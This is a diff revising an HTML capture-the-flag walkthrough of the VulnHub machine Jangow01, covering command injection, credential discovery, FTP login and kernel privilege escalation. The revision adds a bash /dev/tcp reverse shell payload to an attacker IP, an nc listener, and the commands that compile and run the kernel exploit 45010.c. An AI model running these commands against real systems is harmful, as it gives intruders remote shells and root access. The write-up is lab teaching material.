@@ -2,8 +2,8 @@
 
 <h2>Description</h2>
 <p>
-Jangow01 is an easy-level VulnHub machine focused on enumeration, web exploitation,
-credential discovery, and local privilege escalation.
+Jangow01 is an easy-level VulnHub machine that focuses on enumeration, command injection,
+credential discovery, and privilege escalation.
 </p>
 
 <hr>
@@ -18,112 +18,181 @@ credential discovery, and local privilege escalation.
 <hr>
 
 <h2>1. Initial Enumeration</h2>
+
 <p>
-I started with an Nmap scan to identify exposed ports and services on the target.
+I started by scanning the target to identify open ports and services.
 </p>
 
 <pre><code>nmap -sV 10.0.2.15</code></pre>
 
 <p>
-The scan revealed the following open ports:
+The scan revealed:
 </p>
 
 <ul>
-  <li><strong>21/tcp</strong> - FTP</li>
-  <li><strong>80/tcp</strong> - HTTP</li>
+  <li>21/tcp → FTP</li>
+  <li>80/tcp → HTTP</li>
 </ul>
 
 <p>
-Since a web service was available, I decided to focus on HTTP first.
+Since a web service was exposed, I focused on the HTTP attack surface.
 </p>
 
-<br><img width="484" height="90" alt="Screenshot 2026-03-23 121055" src="https://github.com/user-attachments/assets/a7a2445e-2682-4af7-afa3-952aa7ebcabb" />
-
+<p><strong>φωτο απο nmap</strong></p>
 
 <hr>
 
 <h2>2. Web Enumeration</h2>
+
 <p>
-After visiting the target website, I found a parameter that looked interesting:
+While browsing the web application, I identified the following parameter:
 </p>
 
 <pre><code>/site/busque.php?buscar=</code></pre>
 
 <p>
-This parameter appeared to accept user-controlled input directly through the URL,
-so it became the main attack surface.
+This parameter accepted user input directly, which made it a potential target for testing.
 </p>
-<br><img width="1056" height="70" alt="parameter_url" src="https://github.com/user-attachments/assets/697b75c6-c5df-4ec7-ab07-f0e3c30ba487" />
+
+<p><strong>φωτο απο browser με parameter</strong></p>
 
 <hr>
 
-<h2>3. Command Injection Discovery</h2>
+<h2>3. Command Injection</h2>
+
 <p>
-To understand how the parameter behaved, I tested it with a simple command:
+To test for command execution, I injected a simple command:
 </p>
 
 <pre><code>echo test</code></pre>
 
 <p>
-The output was reflected back in the page, which suggested command execution.
+The output was reflected in the response, indicating command execution.
 </p>
 
-<img width="1280" height="330" alt="echo test" src="https://github.com/user-attachments/assets/374a8cac-df2b-4d88-b999-3834ec012c67" />
+<p><strong>φωτο απο echo test</strong></p>
 
 <p>
-To verify the execution context, I used:
+To confirm the execution context:
 </p>
 
 <pre><code>whoami</code></pre>
 
 <p>
-The result was:
+Result:
 </p>
 
 <pre><code>www-data</code></pre>
 
 <p>
-This confirmed that I had remote command execution as the web server user.
+This confirmed remote command execution as the web server user.
 </p>
+
+<p><strong>φωτο απο whoami</strong></p>
 
 <hr>
 
-<h2>4. Credential Discovery</h2>
+<h2>4. Reverse Shell</h2>
+
 <p>
-With command execution available, I began enumerating the file system.
-One of the first directories I checked was the web root:
+To gain a more interactive shell, I set up a listener on my machine:
+</p>
+
+<pre><code>nc -lvnp 443</code></pre>
+
+<p><strong>φωτο απο listener</strong></p>
+
+<p>
+Then I used a reverse shell payload through the vulnerable parameter:
+</p>
+
+<pre><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.10/443 0&gt;&amp;1'</code></pre>
+
+<p>
+After executing the payload, I received a shell on my listener.
+</p>
+
+<p><strong>φωτο απο reverse shell connection</strong></p>
+
+<p>
+To stabilize the shell:
+</p>
+
+<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<p><strong>φωτο απο shell stabilization</strong></p>
+
+<hr>
+
+<h2>5. Credential Discovery</h2>
+
+<p>
+With command execution available, I explored the web directory:
 </p>
 
 <pre><code>ls -la /var/www/html</code></pre>
 
-<img width="968" height="249" alt="list files www" src="https://github.com/user-attachments/assets/f55a0953-12e7-4e8c-8cf8-fe93faf2c1cc" />
-
+<p><strong>φωτο απο ls</strong></p>
 
 <p>
-During enumeration, I discovered a hidden file:
+Inside the application, I found a WordPress directory and accessed a configuration file:
 </p>
 
-<pre><code>.backup</code></pre>
+<pre><code>cat wordpress/config.php</code></pre>
+
+<p><strong>φωτο απο config.php</strong></p>
 
 <p>
-Inspecting this file revealed valid credentials:
+This file contained credentials:
 </p>
 
 <pre><code>jangow01 : abygurl69</code></pre>
 
+<hr>
+
+<h2>6. Credential Validation (FTP)</h2>
+
 <p>
-This was an important finding because it provided a path to move from the web user
-to a real local user account.
+Since FTP was open, I tested the discovered credentials.
 </p>
 
-<img width="1264" height="210" alt="image" src="https://github.com/user-attachments/assets/d049c050-75a5-4434-9e6e-d2f942c8399a" />
+<pre><code>ftp 10.0.2.15</code></pre>
 
+<p>
+First attempt failed with another username.
+</p>
+
+<p><strong>φωτο απο failed ftp login</strong></p>
+
+<p>
+Then I used the correct credentials:
+</p>
+
+<pre><code>
+username: jangow01
+password: abygurl69
+</code></pre>
+
+<p>
+Login was successful.
+</p>
+
+<p><strong>φωτο απο successful ftp login</strong></p>
+
+<p>
+I listed available files:
+</p>
+
+<pre><code>ls</code></pre>
+
+<p><strong>φωτο απο ftp ls</strong></p>
 
 <hr>
 
-<h2>5. User Access</h2>
+<h2>7. User Access</h2>
+
 <p>
-Using the discovered credentials, I switched to the local user:
+Using the same credentials, I switched to the local user:
 </p>
 
 <pre><code>su jangow01</code></pre>
@@ -131,134 +200,118 @@ Using the discovered credentials, I switched to the local user:
 <p><strong>φωτο απο su jangow01</strong></p>
 
 <p>
-To confirm the user context, I ran:
+Verification:
 </p>
 
 <pre><code>whoami</code></pre>
 
-<p>
-The result was:
-</p>
-
 <pre><code>jangow01</code></pre>
 
 <p>
-At this point, I had a more stable shell and a better position for local enumeration.
+At this point, I had a stable shell as a valid system user.
 </p>
 
 <p><strong>φωτο απο whoami jangow01</strong></p>
 
 <hr>
 
-<h2>6. Local Enumeration</h2>
+<h2>8. Local Enumeration</h2>
+
 <p>
-Next, I checked the kernel version to identify possible privilege escalation paths:
+Next, I checked the kernel version:
 </p>
 
 <pre><code>uname -a</code></pre>
 
-<img width="1154" height="291" alt="image" src="https://github.com/user-attachments/assets/1b43fc74-872f-493b-abbc-0a1b0bab0d2e" />
-
+<p><strong>φωτο απο uname</strong></p>
 
 <p>
-The output showed an old Linux kernel:
+The system was running:
 </p>
 
 <pre><code>Linux 4.4.0-31-generic</code></pre>
 
 <p>
-Because the system was running an outdated kernel, local privilege escalation through
-a kernel exploit became a realistic option.
+This is an outdated kernel with known privilege escalation vulnerabilities.
 </p>
 
 <hr>
 
-<h2>7. Privilege Escalation</h2>
+<h2>9. Privilege Escalation</h2>
+
 <p>
-I initially tested one exploit, but it proved unstable and kept retrying without success.
-Since reliability matters, I moved on to a different exploit that was more suitable for the target kernel.
+I initially tested one exploit, but it was unstable and kept retrying.
+So I switched to another exploit compatible with this kernel.
 </p>
 
 <p>
-I then compiled and executed the working exploit:
+I compiled and executed the exploit:
 </p>
 
-<pre><code>gcc 45010.c -o exploit
+<pre><code>
+gcc 45010.c -o exploit
 chmod +x exploit
-./exploit</code></pre>
+./exploit
+</code></pre>
 
-<img width="1082" height="120" alt="ploit second" src="https://github.com/user-attachments/assets/0b66eb4c-de43-45cb-b51f-ccff156a1909" />
-
+<p><strong>φωτο απο exploit run</strong></p>
 
 <p>
-After execution, the exploit patched the current process credentials and spawned a root shell.
+The exploit successfully patched credentials and spawned a root shell.
 </p>
 
 <hr>
 
-<h2>8. Root Access</h2>
-<p>
-To verify that privilege escalation was successful, I ran:
-</p>
+<h2>10. Root Access</h2>
 
 <pre><code>whoami</code></pre>
 
-<p>
-The output was:
-</p>
-
 <pre><code>root</code></pre>
 
-<p>
-This confirmed full system compromise.
-</p>
-
-<img width="1092" height="461" alt="root" src="https://github.com/user-attachments/assets/e1b8f72b-d9a0-49da-8c6e-59eb2a427574" />
-
+<p><strong>φωτο απο root</strong></p>
 
 <hr>
 
-<h2>9. Proof</h2>
-<p>
-Finally, I navigated to the root directory and read the proof file:
-</p>
+<h2>11. Proof</h2>
 
-<pre><code>cd /root
-cat proof.txt</code></pre>
+<pre><code>
+cd /root
+cat proof.txt
+</code></pre>
 
-<img width="1249" height="675" alt="DONE" src="https://github.com/user-attachments/assets/1f5ec581-f947-4c2c-9000-67b930da8f22" />
-
+<p><strong>φωτο απο proof.txt</strong></p>
 
 <hr>
 
 <h2>Summary</h2>
-<p>
-The machine was compromised through the following attack chain:
-</p>
 
 <ul>
-  <li>Service enumeration with Nmap</li>
-  <li>Web parameter analysis</li>
+  <li>Nmap enumeration</li>
+  <li>Web parameter discovery</li>
   <li>Command injection</li>
-  <li>Credential discovery through a hidden backup file</li>
-  <li>User pivot to <code>jangow01</code></li>
-  <li>Kernel-based privilege escalation</li>
-  <li>Root access and proof retrieval</li>
+  <li>Reverse shell access</li>
+  <li>Credential extraction from config file</li>
+  <li>FTP validation</li>
+  <li>User pivot</li>
+  <li>Kernel exploit</li>
+  <li>Root access</li>
 </ul>
 
 <hr>
 
 <h2>Key Takeaways</h2>
+
 <ul>
-  <li>Simple web parameters can hide critical vulnerabilities.</li>
-  <li>Hidden files inside web directories are high-value targets.</li>
-  <li>Good enumeration makes exploitation much easier.</li>
-  <li>If one exploit is unstable, adapt and move to another approach.</li>
+  <li>Input validation failures lead to command injection</li>
+  <li>Configuration files often expose credentials</li>
+  <li>Reverse shells provide better control than web shells</li>
+  <li>Privilege escalation depends on proper enumeration</li>
 </ul>
 
 <hr>
 
 <h2>Disclaimer</h2>
+
 <p>
-This walkthrough was created for educational purposes in a controlled lab environment.
+This walkthrough was conducted in a controlled lab environment for educational purposes only.
 </p>
